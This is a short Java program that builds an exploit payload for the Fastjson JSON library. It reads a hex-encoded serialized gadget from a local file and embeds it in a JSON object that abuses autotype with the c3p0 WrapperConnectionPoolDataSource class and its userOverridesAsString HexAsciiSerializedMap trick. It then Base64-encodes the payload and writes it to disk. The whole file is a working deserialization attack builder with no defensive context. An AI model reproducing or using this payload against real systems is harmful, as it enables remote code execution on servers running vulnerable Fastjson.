import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class json_exp {
    public static void main(String[] args) throws IOException {

        String content = String.join("\n", Files.readAllLines(Paths.get("D:\\tmp\\hex.txt")));
        String payload = "{\"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"," +
                " \"userOverridesAsString\": \"HexAsciiSerializedMap:" + content + ";\"}";
        String s = Base64.getEncoder().encodeToString(payload.getBytes("UTF-8"));
        new FileOutputStream("D:\\tmp\\fastjson.txt").write(s.getBytes());
    }
}
